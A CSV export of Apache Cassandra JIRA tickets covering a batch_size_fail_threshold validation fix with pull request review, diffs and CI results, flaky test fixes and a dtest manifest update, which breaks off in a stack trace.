-        conf.batch_size_warn_threshold = new DataStorageSpec.IntKibibytesBound(threshold);
+        conf.batch_size_warn_threshold = createIntKibibyteBoundAndEnsureItIsValidForByteConversion(threshold,""batch_size_warn_threshold"");
     }
 
     public static void setBatchSizeFailThresholdInKiB(int threshold)
     {
-        conf.batch_size_fail_threshold = new DataStorageSpec.IntKibibytesBound(threshold);
+        conf.batch_size_fail_threshold = createIntKibibyteBoundAndEnsureItIsValidForByteConversion(threshold,""batch_size_fail_threshold"");
+    }
+
+    private static DataStorageSpec.IntKibibytesBound createIntKibibyteBoundAndEnsureItIsValidForByteConversion(int byteValue, String configName){

Review Comment:
   This is part of the new config format where users can provide unit of their choice. Now, they cannot provide at the moment any unit smaller than the one used internally by Cassandra for a respective property because during conversion there can be lost precision. Also, we will run into more issues with the accepted upper bound. So in the case we call `DataStorageSpec.IntKibibytesBound(10, MEBIBYTES)` which says - the user wants/provides 10Mebibytes for a property which was type Int and it is used in Kibibytes by Cassandra internally. So it can't be more than Integer.MAX_VALUE-1 in kibibytes. Please refer to the Java Doc and this document - https://cassandra.apache.org/doc/trunk/cassandra/new/configuration.html
   
   `batch_size_fail_threshold `- It can't be more than `Integer.MAX_VALUE` in kibibytes. So the long widening when we return it in bytes can accommodate this. But currently `getBatchSizeFailThreshold()` uses the` IntKibibytesBound.toBytes()` which would return Int and this is a bug. We will need to create a new method `IntKibibytesBound.toBytesInLong()` to be used by `getBatchSizeFailThreshold() `
   



;21/Jun/22 21:40;githubbot;600","akin-tekeoglu commented on code in PR #1696:
URL: https://github.com/apache/cassandra/pull/1696#discussion_r905359381


##########
src/java/org/apache/cassandra/config/DatabaseDescriptor.java:
##########
@@ -1656,14 +1653,18 @@ public static int getUnloggedBatchAcrossPartitionsWarnThreshold()
 
     public static void setBatchSizeWarnThresholdInKiB(int threshold)
     {
-        DataStorageSpec.IntKibibytesBound storage = new DataStorageSpec.IntKibibytesBound(threshold);
-        checkValidForByteConversion(storage, ""batch_size_warn_threshold"");
-        conf.batch_size_warn_threshold = new DataStorageSpec.IntKibibytesBound(threshold);
+        conf.batch_size_warn_threshold = createIntKibibyteBoundAndEnsureItIsValidForByteConversion(threshold,""batch_size_warn_threshold"");
     }
 
     public static void setBatchSizeFailThresholdInKiB(int threshold)
     {
-        conf.batch_size_fail_threshold = new DataStorageSpec.IntKibibytesBound(threshold);
+        conf.batch_size_fail_threshold = createIntKibibyteBoundAndEnsureItIsValidForByteConversion(threshold,""batch_size_fail_threshold"");
+    }
+
+    private static DataStorageSpec.IntKibibytesBound createIntKibibyteBoundAndEnsureItIsValidForByteConversion(int byteValue, String configName){

Review Comment:
   I tried to fix the issues that you mentioned before as well. Please retake a look.



;23/Jun/22 18:54;githubbot;600","ekaterinadimitrova2 commented on code in PR #1696:
URL: https://github.com/apache/cassandra/pull/1696#discussion_r905640895


##########
src/java/org/apache/cassandra/config/DatabaseDescriptor.java:
##########
@@ -559,6 +559,7 @@ else if (conf.repair_session_space.toMebibytes() > (int) (Runtime.getRuntime().m
         checkValidForByteConversion(conf.column_index_size, ""column_index_size"");
         checkValidForByteConversion(conf.column_index_cache_size, ""column_index_cache_size"");
         checkValidForByteConversion(conf.batch_size_warn_threshold, ""batch_size_warn_threshold"");
+        checkValidForByteConversion(conf.batch_size_fail_threshold, ""batch_size_fail_threshold"");

Review Comment:
   As we opted in for restoring the widening, I believe this check is not needed and expected anymore. It will also reduce the established upper bound from the previous versions.
   It should have upper bound Integer.MAX_VALUE-1 in kibibytes, not bytes and the kibibytes upper value is already handled in the constructor.



##########
test/unit/org/apache/cassandra/config/DatabaseDescriptorTest.java:
##########
@@ -326,7 +326,8 @@ public void testExceptionsForInvalidConfigValues() {
             fail(""Should have received a ConfigurationException batch_size_warn_threshold = 2GiB"");
         }
         catch (ConfigurationException ignored) { }
-        Assert.assertEquals(4096, DatabaseDescriptor.getColumnIndexSize());
+        Assert.assertEquals(5120, DatabaseDescriptor.getBatchSizeWarnThreshold());
+
     }
 

Review Comment:
   I suggest we add below test in order to ensure no more regressions in the future in this area. We can also add a comment about that as Andres suggested on the ticket, to be more clear what is this and where it came from. (for legacy reasons we do widen to long instead of the check)
   
   ```
       @Test
       public void testWidenToLongInBytes() throws ConfigurationException
       {
           DatabaseDescriptor.setBatchSizeFailThresholdInKiB(2147483646);
           Assert.assertEquals((2147483646L * 1024), DatabaseDescriptor.getBatchSizeFailThreshold());
       }
   ```



;24/Jun/22 02:01;githubbot;600","akin-tekeoglu commented on code in PR #1696:
URL: https://github.com/apache/cassandra/pull/1696#discussion_r906200627


##########
src/java/org/apache/cassandra/config/DatabaseDescriptor.java:
##########
@@ -559,6 +559,7 @@ else if (conf.repair_session_space.toMebibytes() > (int) (Runtime.getRuntime().m
         checkValidForByteConversion(conf.column_index_size, ""column_index_size"");
         checkValidForByteConversion(conf.column_index_cache_size, ""column_index_cache_size"");
         checkValidForByteConversion(conf.batch_size_warn_threshold, ""batch_size_warn_threshold"");
+        checkValidForByteConversion(conf.batch_size_fail_threshold, ""batch_size_fail_threshold"");

Review Comment:
   Updated



##########
src/java/org/apache/cassandra/config/DatabaseDescriptor.java:
##########
@@ -559,6 +559,7 @@ else if (conf.repair_session_space.toMebibytes() > (int) (Runtime.getRuntime().m
         checkValidForByteConversion(conf.column_index_size, ""column_index_size"");
         checkValidForByteConversion(conf.column_index_cache_size, ""column_index_cache_size"");
         checkValidForByteConversion(conf.batch_size_warn_threshold, ""batch_size_warn_threshold"");
+        checkValidForByteConversion(conf.batch_size_fail_threshold, ""batch_size_fail_threshold"");

Review Comment:
   Removed the check



;24/Jun/22 16:01;githubbot;600","akin-tekeoglu commented on code in PR #1696:
URL: https://github.com/apache/cassandra/pull/1696#discussion_r906200809


##########
test/unit/org/apache/cassandra/config/DatabaseDescriptorTest.java:
##########
@@ -326,7 +326,8 @@ public void testExceptionsForInvalidConfigValues() {
             fail(""Should have received a ConfigurationException batch_size_warn_threshold = 2GiB"");
         }
         catch (ConfigurationException ignored) { }
-        Assert.assertEquals(4096, DatabaseDescriptor.getColumnIndexSize());
+        Assert.assertEquals(5120, DatabaseDescriptor.getBatchSizeWarnThreshold());
+
     }
 

Review Comment:
   Added the test



;24/Jun/22 16:01;githubbot;600","smiklosovic closed pull request #1696: CASSANDRA-17650: Add validation for batch_size_fail_threshold
URL: https://github.com/apache/cassandra/pull/1696


;30/Jun/22 06:21;githubbot;600",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0,10200,,,0,10200,,,,,,,,,,,,,,,,,,,,,CASSANDRA-17716,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,akin-tekeoglu,,,,,,,,,,,,,,,,,,,,,Operability,Low Hanging Fruit,,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Wed Jul 06 15:57:21 UTC 2022,,,,,,,All,,,,"0|z12k8w:",9223372036854775807,,,,adelapena,e.dimitrova,,,,,4.1-alpha1,,https://github.com/apache/cassandra/commit/07e5876c43998fe7384df115c65749d668183130,,,,,,,,,The current unit tests pass plus a new one was added to prevent us from future regressions,,,,,"20/May/22 21:19;e.dimitrova;For now marked only 4.0 and 4.1 where that check was introduced.;;;","18/Jun/22 20:13;akin-tekeoglu;[~e.dimitrova]  I can confirm that batch_size_warn_threshold goes through checkValidForByteConversion on startup (DatabaseDescriptor L561). Shall we change it to bug?;;;","20/Jun/22 11:28;e.dimitrova;Hi [~akin-tekeoglu]! Thanks for looking into this ticket. You are right about that validation, but the question is whether batch_size_{_}fail{_}_threshold needs it too or not. Please feel free to assign the ticket if you are interested to work on it. Also, please, let me know if you need any help;;;","20/Jun/22 20:42;akin-tekeoglu;Hi [~e.dimitrova], thanks for correcting me. There is no validation for batch_size_{_}fail{_}_threshold at the moment (DatabaseDescriptior L1666). Since it is also a byte, I think it must go through the same checks as batch_size_warn_threshold. ;;;","20/Jun/22 21:25;akin-tekeoglu;I created the [PR|https://github.com/apache/cassandra/pull/1696] but the issue tracker didn't pick it up. Shall I submit a patch or PR is enough?;;;","20/Jun/22 23:11;e.dimitrova;PR is enough. Normally we set the ticket to Patch Available or Need Committer to signal the ticket is ready for review.  

I went back to the original ticket mentioned in the description - CASSANDRA-15470, further to looking for the validations existence. It is stated that the check is added for those properties which are not widened to long. 

It seems to me that getBatchSizeFailThreshold returns long and that is why the validation was not added. 

It is a bit confusing as now some properties are checked for overflow, others are widened. I don't think we should change that as Long.MAX_VALUE is bigger than Integer.MAX_VALUE*1024 and this will mean we will cap the max to a lower number and thus introduce a bug. The check makes sense where int is returned by the getter in bytes as then we have the potential for overflow in bytes.

On the other hand I see in your PR you fixed the DatabaseDescriptorTest line 329 which is valid and I think we should commit that part.  Good catch, thanks.

[~adelapena], do you mind to review this too? I believe we don't need full CI run for this test fix. I checked it and ran the test locally.  ;;;","21/Jun/22 15:17;adelapena;I also understand that validation for {{batch_size_fail_threshold}} was skipped from validation because it already had widening to long, and adding validation to it would have reduced the max accepted value of the property. This would have left a max {{batch_size_fail_threshold}} of almost 2GiB, which is much lower than the previous maximum but probably still high enough for a reasonable use, I'd say.

So I think that the missed validation is correct at least in 4.0, albeit quite confusing IMO. We should probably add some comment around if we are not going to do further changes. 

However, in 4.1 and trunk the usage of {{IntKibibytesBound#bytes}} in {{DatabaseDescriptor#getBatchSizeFailThreshold}} breaks the widening that was used in the previous branches. So I guess we'll have to either add a method in {{IntKibibytesBound}} that returns a long, or use validation as suggested and reduce the max accepted value for {{batch_size_fail_threshold}}. Probably the former is preferable for backward-compatibility, although int bytes seem more than enough for {{batch_size_fail_threshold}}. wdyt?

As for 3.0 and 3.11, it seems that there are methods without widening nor validation. I don't know why those branches weren't fixed by CASSANDRA-15470.
;;;","21/Jun/22 16:13;e.dimitrova;{quote}So I think that the missed validation is correct at least in 4.0, albeit quite confusing IMO. We should probably add some comment around if we are not going to do further changes.
{quote}
+1, and also some unit tests which cover the bounds for that config to ensure we don't regress in the future again.
{quote}However, in 4.1 and trunk the usage of {{IntKibibytesBound#bytes}} in {{DatabaseDescriptor#getBatchSizeFailThreshold}} breaks the widening that was used in the previous branches. 
{quote}
You are right, good catch! Marking the ticket as a blocker. I suggest we keep the consistency with 4.0 by adding a method that returns long bytes. Something like _toBytesInLong_ in {_}IntKibibytesBound{_}. It seems that _batch_size_fail_threshold_ is the only parameter of type _IntKibibytesBound_ that suffers from this issue. 

Now, I went ahead and did a further check for the other properties that are widen to long as it seems this bug was introduced when we removed the static methods from _DataStorageSpec._

We will need to add _toBytesInLong_ also for _IntMebibytesBound_ to cover _getMinFreeSpacePerDriveInBytes() /_ min_free_space_per_drive,

_compaction_large_partition_warning_threshold / getMinFreeSpacePerDriveInBytes(), getMaxHintsFileSize() / max_hints_file_size_
{quote}As for 3.0 and 3.11, it seems that there are methods without widening nor validation. I don't know why those branches weren't fixed by CASSANDRA-15470.
{quote}
I am also not sure, I think in general config parameters tightening starts with 4.0. From the comments on the original ticket it seems this was something in between improvement and bug fixing as overflowing was considered as unlikely but possible. 

Shall we fix all this with this ticket or spin another one? 

 ;;;","25/Jun/22 01:10;e.dimitrova;The latest version LGTM. The patch fixes the issue with _IntKibibytesBound_ and _batch_size_fail_threshold._ (I will push a separate ticket and fix on Monday for  {_}IntMebibytesBound{_})

If [~adelapena] doesn't have any additional comments, I believe we can squash and apply the patch to 4.1 and trunk and run CI on both branches.

For now I rebased and pushed an intermediate version on the current trunk branch for a sanity check: [CI|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra?branch=CASSANDRA-17650&filter=all]

{*}EDIT{*}: CI LGTM, we only need to correct the number in _testInvalidValue_ from 

2147483647B to 2147483648B - side effect of adding the new method and not using the saturated cast which was wrong. 

 ;;;","26/Jun/22 18:18;akin-tekeoglu;[~e.dimitrova] Updated the test;;;","27/Jun/22 10:49;adelapena;Looks good to me, nothing else to add. I have squashed+rebased the patch and applied it to 4.1 without conflicts, CI is running:
||PR||CI||
|[4.1|https://github.com/adelapena/cassandra/tree/17650-4.1-review]|[j8|https://app.circleci.com/pipelines/github/adelapena/cassandra/1730/workflows/f7d5adcc-f4f0-4c9f-ab9d-a0be4140f58d] [j11|https://app.circleci.com/pipelines/github/adelapena/cassandra/1730/workflows/afa9f339-64e3-4a58-9fbf-b5c05b6a24f1]|
|[trunk|https://github.com/adelapena/cassandra/tree/17650-trunk-review]|[j8|https://app.circleci.com/pipelines/github/adelapena/cassandra/1731/workflows/1d855d29-a32d-4056-b5b1-3a8f3ec14ab8] [j11|https://app.circleci.com/pipelines/github/adelapena/cassandra/1731/workflows/b57a5e69-d01d-447f-9de1-bae9110becb1]|;;;","27/Jun/22 16:28;e.dimitrova;4.1:

utests_system_keyspace_directory - CASSANDRA-17489

test_multiple_repair - known OperationTimeout which we see every once in a while

trunk:

test_prefer_local_reconnect_on_listen_address - CASSANDRA-17700

testRemoteStreamFailure - CASSANDRA-17706

TopPartitionsTest - CASSANDRA-17455

 

I believe this is ready to commit, we only need a CHANGES.txt entry;;;","28/Jun/22 20:54;e.dimitrova;Got approval offline.

Rebased and fixed merge conflicts with CASSANDRA-17716.

Running last CI:

[4.1|https://github.com/apache/cassandra/commit/1dbf00c618ce98fdf99b7402eef490be3e61478b] - [CircleCI|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra?branch=17650-4.1-review&filter=all]

[trunk|https://github.com/ekaterinadimitrova2/cassandra/commit/f353cd143b26c7113ef129cce487cf1f019aeb7b] - [CircleCI|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra?branch=17650-trunk-review&filter=all];;;","28/Jun/22 22:27;e.dimitrova;CI didn't show anything new.

Committed To https://github.com/apache/cassandra.git
   495d609c89..07e5876c43  cassandra-4.1 -> cassandra-4.1
   63c6467746..8ffaf4af62  trunk -> trunk

Thanks [~akin-tekeoglu]!;;;","06/Jul/22 15:57;jmckenzie;[CI Results]
Branch: 4.1, build number: 81
   butler url: https://butler.cassandra.apache.org/#/ci/upstream/compare/Cassandra-4.1/Cassandra-4.1
   jenkins url: https://ci-cassandra.apache.org/job/Cassandra-4.1/81/
   JIRA: CASSANDRA-17650
   commit url: https://gitbox.apache.org/repos/asf?p=cassandra.git;a=commit;h=07e5876c43998fe7384df115c65749d668183130
   affected paths:
* src/java/org/apache/cassandra/config/DataStorageSpec.java
* src/java/org/apache/cassandra/config/DatabaseDescriptor.java
* test/unit/org/apache/cassandra/config/DatabaseDescriptorTest.java
* CHANGES.txt
* test/unit/org/apache/cassandra/tools/nodetool/SetGetColumnIndexSizeTest.java

   Build Result: UNSTABLE
   Passing Tests: 47003
   Failing Tests: 25

||Test|Failures|JIRA||
|org.apache.cassandra.distributed.test.SchemaTest.readRepairWithCompaction|22 of 78|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]
|org.apache.cassandra.cql3.validation.entities.SecondaryIndexTest.testIndexOnClusteringKeyInsertExpiringColumn|8 of 78|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]
|org.apache.cassandra.distributed.upgrade.CompactStorageImplicitNullInClusteringTest.testImplicitNullInClusteringWithCompactStorage|6 of 78|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]
|junit.framework.TestSuite.org.apache.cassandra.distributed.test.guardrails.GuardrailDiskUsageTest|1 of 78|[Multiple JIRAs found|https://issues.apache.org/jira/issues/?jql=project%20%3D%20CASSANDRA%20and%20resolution%20%3D%20unresolved%20and%20summary%20~%20""*guardrails*""]
|dtest-upgrade.upgrade_tests.upgrade_through_versions_test.TestProtoV4Upgrade_AllVersions_RandomPartitioner_EndsAt_Trunk_HEAD.test_parallel_upgrade_with_internode_ssl|5 of 78|[CASSANDRA-17296?|https://issues.apache.org/jira/browse/CASSANDRA-17296]|
|dtest-upgrade.upgrade_tests.upgrade_through_versions_test.TestProtoV4Upgrade_AllVersions_EndsAt_Trunk_HEAD.test_parallel_upgrade_with_internode_ssl|4 of 78|[CASSANDRA-17296?|https://issues.apache.org/jira/browse/CASSANDRA-17296]|
|junit.framework.TestSuite.org.apache.cassandra.distributed.test.CASMultiDCTest|7 of 78|[Multiple JIRAs found|https://issues.apache.org/jira/issues/?jql=project%20%3D%20CASSANDRA%20and%20resolution%20%3D%20unresolved%20and%20summary%20~%20""*test*""]
|org.apache.cassandra.distributed.upgrade.BatchUpgradeTest.batchTest|24 of 78|[CASSANDRA-17651?|https://issues.apache.org/jira/browse/CASSANDRA-17651]|
|org.apache.cassandra.tools.TopPartitionsTest.testServiceTopPartitionsSingleTable|10 of 78|[CASSANDRA-17649?|https://issues.apache.org/jira/browse/CASSANDRA-17649]|
|org.apache.cassandra.cql3.validation.entities.SecondaryIndexTest.testSelectOnMultiIndexOnCollectionsWithNull|8 of 78|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]
|org.apache.cassandra.tools.TopPartitionsTest.testServiceTopPartitionsSingleTable-cdc|7 of 78|[CASSANDRA-17649?|https://issues.apache.org/jira/browse/CASSANDRA-17649]|
|org.apache.cassandra.net.ConnectionTest.testMessageDeliveryOnReconnect-compression|6 of 78|[CASSANDRA-16677?|https://issues.apache.org/jira/browse/CASSANDRA-16677]|
|dtest-upgrade.upgrade_tests.drop_compact_storage_upgrade_test.TestDropCompactStorage.test_drop_compact_storage_mixed_cluster|10 of 78|[CASSANDRA-17634?|https://issues.apache.org/jira/browse/CASSANDRA-17634]|
|org.apache.cassandra.cql3.validation.entities.SecondaryIndexTest.testIndexOnRegularColumnInsertExpiringColumnWithFlush|8 of 78|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]
|org.apache.cassandra.cql3.ViewComplexTTLTest.testUpdateColumnInViewPKWithTTLWithFlush[3]|16 of 78|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]
|org.apache.cassandra.distributed.test.CASTest.testConflictingWritesWithStaleRingInformation|19 of 78|[CASSANDRA-17461?|https://issues.apache.org/jira/browse/CASSANDRA-17461]|
|org.apache.cassandra.distributed.test.CASTest.testSucccessfulWriteDuringRangeMovementFollowedByRead|11 of 78|[CASSANDRA-17461?|https://issues.apache.org/jira/browse/CASSANDRA-17461]|
|org.apache.cassandra.distributed.test.CASTest.testIncompleteWriteFollowedBySuccessfulWriteWithStaleRingDuringRangeMovementFollowedByRead|4 of 78|[CASSANDRA-17461?|https://issues.apache.org/jira/browse/CASSANDRA-17461]|
|org.apache.cassandra.distributed.test.CASTest.testSuccessfulWriteBeforeRangeMovement|8 of 78|[CASSANDRA-17461?|https://issues.apache.org/jira/browse/CASSANDRA-17461]|
|org.apache.cassandra.cql3.validation.entities.TupleTypeTest.testReversedTypeTuple|5 of 78|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]
|org.apache.cassandra.distributed.test.SchemaTest.readRepair|18 of 78|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]
|org.apache.cassandra.cql3.validation.entities.SecondaryIndexTest.testIndexOnNonFrozenCollectionOfFrozenUDT|3 of 78|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]
|org.apache.cassandra.distributed.test.AutoSnapshotTtlTest.testAutoSnapshotTTlOnDropAfterRestart|4 of 78|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]
|org.apache.cassandra.distributed.upgrade.MixedModeFrom3ReplicationTest.testSimpleStrategy|6 of 78|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]
;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Fix flaky tests in TopPartitionsTest,CASSANDRA-17649,13446118,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,e.dimitrova,e.dimitrova,e.dimitrova,20/May/22 21:04,05/Oct/22 22:22,13/Jul/23 08:40,20/Jul/22 22:11,4.1,4.1-beta1,,,,,CI,,,,0,,"While working on other tickets we noticed a few tests from TopPartitionTest are flaky on 4.1. 

Example run with the CircleCI multiplexer: [https://app.circleci.com/pipelines/github/adelapena/cassandra?branch=flaky_top_partitions_test_4.1&filter=all]

I haven't seen those in Jenkins though. ",,adelapena,bereng,dcapwell,e.dimitrova,maedhroz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,CASSANDRA-17616,,,,,,,,,,,,,,CASSANDRA-17571,,,,,,,,,,,,0.0,dcapwell,e.dimitrova,,,,,,,,,,,,,Correctness -> Test Failure,,,,,,,,Normal,User Report,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Wed Jul 20 22:10:46 UTC 2022,,,,,,,All,,,,"0|z12k88:",9223372036854775807,,,,maedhroz,,,,Normal,,4.1-alpha1,,https://github.com/apache/cassandra/commit/b4e58d83fc72f8babf61367aad23a9499df69881,,,,,,,,,"||Patch||CI||
|[4.1|https://github.com/ekaterinadimitrova2/cassandra/commit/7dc15ed096a676355cf841ca98eea01ca9a34a2b]|CircleCI test in a loop: [j8|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1790/workflows/39d41ffb-57c8-48c4-99fe-f4753ca3ef3b], [j11|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1790/workflows/ab9c462c-cd83-4323-9e52-4c6caf64d5e4]|
|[trunk|https://github.com/apache/cassandra/commit/29b99e158977693c243490bb45bcbc2a39cecd9a]|CircleCI test in a loop: [j8|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1791/workflows/604773ab-58ea-41dc-ae11-937354a054b6], [j11|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1791/workflows/d7acf107-4497-4787-ac4f-352f4bf44ff1]|

Run in a loop the test class",,,,,"23/May/22 12:04;adelapena;This has been reproduced on Circle using the patch for CASSANDRA-17649. Using that patch, the config with vnodes can be generated with
{code:java}
.circleci/generate.sh -m \
  -e REPEATED_UTEST_TARGET=test-jvm-dtest-some \
  -e REPEATED_UTEST_VNODES=true \
  -e REPEATED_UTEST_COUNT=10 \
  -e REPEATED_UTEST_CLASS=org.apache.cassandra.distributed.test.TopPartitionsTest  {code}
We have initially seen this failing on [the CI runs|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1637/workflows/1a88c5ec-536e-4f55-bacd-dba538c77c33/jobs/11307/tests] for CASSANDRA-17571.;;;","25/May/22 09:37;bereng;^you probably mean the patch for CASSANDRA-17616;;;","25/May/22 10:26;adelapena;Yes, thanks, I meant CASSANDRA-17616.;;;","18/Jul/22 21:41;e.dimitrova;This seems to be a test issue.

Running the test class In a loop with only incremental repair was [always passing|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra?branch=basic-range-tombstone&filter=all]. 

The moment we run it parameterized, incremental and preview repairs seem to crash. Looking into the repair method in the test class, we see the nodetool  command was successfully triggered but we don't check that the repair has been completed.

I added some additional checks and the test seems not to be flaky anymore.

[~marcuse], do you mind to review the patch as the original author of this test? Or maybe [~dcapwell] ? 
||Patch||CI||
|[4.1|https://github.com/ekaterinadimitrova2/cassandra/commit/7dc15ed096a676355cf841ca98eea01ca9a34a2b]|CircleCI test in a loop: [j8|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1790/workflows/39d41ffb-57c8-48c4-99fe-f4753ca3ef3b], [j11|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1790/workflows/ab9c462c-cd83-4323-9e52-4c6caf64d5e4]|
|[trunk|https://github.com/apache/cassandra/commit/29b99e158977693c243490bb45bcbc2a39cecd9a]|CircleCI test in a loop: [j8|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1791/workflows/604773ab-58ea-41dc-ae11-937354a054b6], [j11|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1791/workflows/d7acf107-4497-4787-ac4f-352f4bf44ff1]|;;;","20/Jul/22 21:14;dcapwell;{code}
PreviewRepairTest.waitLogsRepairFullyFinished(CLUSTER, marks);
{code}

Sad but agree with the patch.  The issue is documented in another JIRA about issues with repair, but IR completes and shuts down on coordinator before the peers (we sent commit and exit, so the peer may still be running the repair by the time we start the second one).

+1;;;","20/Jul/22 21:42;maedhroz;+1 from me as well

I had to do something similar to fix {{ReparErrorsTest#testRemoteSyncFailure()}}, although in that case it was just relaxing a check on parent sessions.

(CASSANDRA-16909 is the other Jira of current issues w/ repair.);;;","20/Jul/22 22:10;e.dimitrova;Thank you both!

To https://github.com/apache/cassandra.git

   bc40f0c17c..b4e58d83fc  cassandra-4.1 -> cassandra-4.1

   f251e5052e..ab9ab903fa  trunk -> trunk;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
python dtest upgrade manifest needs versions made current,CASSANDRA-17645,13446031,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,brandon.williams,brandon.williams,brandon.williams,20/May/22 10:01,16/Dec/22 21:54,13/Jul/23 08:40,31/May/22 10:36,3.0.28,3.11.14,4.0.5,4.1,4.1-beta1,,Test/dtest/python,,,,0,,"As the title says, it's currently testing 4.0.3, 3.11.12, and 3.0.26.",,bereng,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,brandon.williams,,,,,,,,,,,,,,Correctness,,,,,,,,Low Hanging Fruit,User Report,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Tue May 31 10:36:46 UTC 2022,,,,,,,All,,,,"0|z12jow:",9223372036854775807,,,,bereng,,,,Normal,,NA,,https://github.com/apache/cassandra-dtest/commit/c476642d9503b7ecce5bd329ed4bc0789c1142d2,,,,,,,,,run CI,,,,,"23/May/22 17:50;brandon.williams;Simple [patch|https://github.com/driftx/cassandra-dtest/commit/90917f2ba0f750b0eda88ca405b0b7fb89c3ee7a] and [circle|https://app.circleci.com/pipelines/github/driftx/cassandra/497/workflows/42a31d34-ed57-4c2f-830d-36acb5ad7ded] with upgrade tests.;;;","31/May/22 10:01;bereng;LGTM. We'd probably need CI runs for all versions but at the same time that is a bit of an overkill, we don't want to bring down CI either and we have a trunk CI run already. Given the revert is immediately obvious, and as an exception, I am ok merging as in this occasion without the other CIs.;;;","31/May/22 10:36;brandon.williams;Yeah, I thought doing a run for each branch would be overkill, and all we are really checking is that the test runs.  If there are new failures, they would probably caused by bugs in the new versions, not the manifest that defines them to be tested.

Thanks, and committed.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Fix flaky dtest - org.apache.cassandra.distributed.upgrade.CompactStorageUpgradeTest.compactStorageImplicitNullInClusteringTest,CASSANDRA-17642,13445873,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,,brandon.williams,brandon.williams,19/May/22 16:24,05/Oct/22 22:22,13/Jul/23 08:40,01/Jul/22 05:23,4.1.x,4.1-beta1,,,,,Local/Compaction,,,,0,,"{code}
org.apache.cassandra.distributed.shared.ShutdownException: Uncaught exceptions were thrown during test
	at org.apache.cassandra.distributed.impl.AbstractCluster.checkAndResetUncaughtExceptions(AbstractCluster.java:1056)
	at org.apache.cassandra.distributed.impl.AbstractCluster.close(AbstractCluster.java:1042)
	at org.apache.cassandra.distributed.upgrade.UpgradeTestBase$TestCase.run(UpgradeTestBase.java:239)
	at org.apache.cassandra.distributed.upgrade.CompactStorageUpgradeTest.compactStorageImplicitNullInClusteringTest(CompactStorageUpgradeTest.java:107)
	Suppressed: java.lang.RuntimeException: java.lang.AssertionError
		at org.apache.cassandra.net.InboundSink.accept(InboundSink.java:108)
		at org.apache.cassandra.distributed.impl.Instance.lambda$null$6(Instance.java:495)
		at org.apache.cassandra.concurrent.ExecutionFailure$1.run(ExecutionFailure.java:124)
		at org.apache.cassandra.concurrent.SEPWorker.run(SEPWorker.java:120)
